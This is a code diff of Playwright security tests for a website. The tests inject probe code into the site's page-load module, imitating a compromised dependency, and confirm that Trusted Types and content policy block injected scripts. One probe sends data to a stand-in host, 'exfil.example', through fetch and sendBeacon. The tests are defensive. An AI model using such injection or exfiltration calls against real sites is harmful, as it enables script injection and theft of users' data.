@@ -5,16 +5,23 @@ import { expect, test, type Page } from '@playwright/test';
 //
 // Each probe arrives the way an attack would: as markup injected into the
 // served HTML, or as extra code inside a script the policy lets run (our own
-// main.js standing in for a compromised dependency). Trusted Types refuses
+// page-load module standing in for a compromised dependency). Trusted Types refuses
 // the DOM's own ways of injecting a script, so the probes cannot add one.
 
-/** Stub Turnstile, and append `probe` to the site's own main.js. */
-async function compromiseMainJs(page: Page, probe: string) {
+/**
+ * The page-load module every page runs (BaseLayout.astro: the Sentry bootstrap, prefetch and
+ * src/scripts/main.ts), an /_astro/ file in a build with monitoring on, as the journey's and
+ * production's are.
+ */
+const PAGE_MODULE = '**/_astro/BaseLayout.astro_astro_type_script_*.js';
+
+/** Stub Turnstile, and append `probe` to the site's own page-load module. */
+async function compromisePageModule(page: Page, probe: string) {
   await page.route('**/challenges.cloudflare.com/**', (route) => route.fulfill({
     contentType: 'text/javascript',
     body: 'window.turnstile={getResponse:()=>"journey-token",reset(){},render(){}};',
   }));
-  await page.route('**/assets/js/main.js*', async (route) => {
+  await page.route(PAGE_MODULE, async (route) => {
     const original = await route.fetch();
     await route.fulfill({ response: original, body: `${await original.text()}\n;${probe}` });
   });
@@ -68,7 +75,7 @@ const REFUSED = {
 };
 
 test('pages refuse unapproved scripts, event handlers, eval and HTML strings', async ({ page }) => {
-  await compromiseMainJs(page, SINK_PROBE);
+  await compromisePageModule(page, SINK_PROBE);
   const violations = await recordViolations(page);
   // Stored-XSS stand-in: markup injected into the HTML as it is served.
   await page.route('**/*', async (route) => {
@@ -86,8 +93,8 @@ test('pages refuse unapproved scripts, event handlers, eval and HTML strings', a
   for (const path of ['/', '/contact/', '/field-notes/', '/services.html/index.html', '/no-such-page-security/']) {
     await page.goto(path);
     // A legacy redirect stub 301s to its page through the edge Worker, so only
-    // assert the DOM-sink probe when main.js ran on the landed page.
-    const hasMain = (await page.locator('script[src*="/assets/js/main.js"]').count()) > 0;
+    // assert the DOM-sink probe when the page-load module ran on the landed page.
+    const hasMain = (await page.locator('script[src*="/_astro/BaseLayout.astro_astro_type_script_"]').count()) > 0;
     if (hasMain) await expect(page.locator('html')).toHaveAttribute('data-sink-probe', /./);
     // Violation events are queued by the browser, after script execution.
     await page.waitForTimeout(100);
@@ -114,7 +121,7 @@ test('pages refuse unapproved scripts, event handlers, eval and HTML strings', a
 // /contact/'s one Trusted Types policy loads Turnstile's exact URL and
 // nothing else: a script that reaches it cannot load another script with it.
 test('the contact page can load only the Turnstile script', async ({ page }) => {
-  await compromiseMainJs(page, `(() => {
+  await compromisePageModule(page, `(() => {
     const created = (name) => { try { trustedTypes.createPolicy(name, { createScriptURL: (u) => u }); return 'allowed'; } catch (e) { return e.name; } };
     document.documentElement.dataset.policyProbe = created('turnstile');
   })();`);
@@ -136,7 +143,7 @@ test('pages cannot send data to any other origin', async ({ page }) => {
     leaked.push(route.request().url());
     return route.fulfill({ status: 204 });
   });
-  await compromiseMainJs(page, `(() => {
+  await compromisePageModule(page, `(() => {
     const out = 'https://exfil.example/collect?d=probe';
     fetch(out, { mode: 'no-cors' }).catch(() => {});
     try { navigator.sendBeacon(out, 'probe'); } catch {}
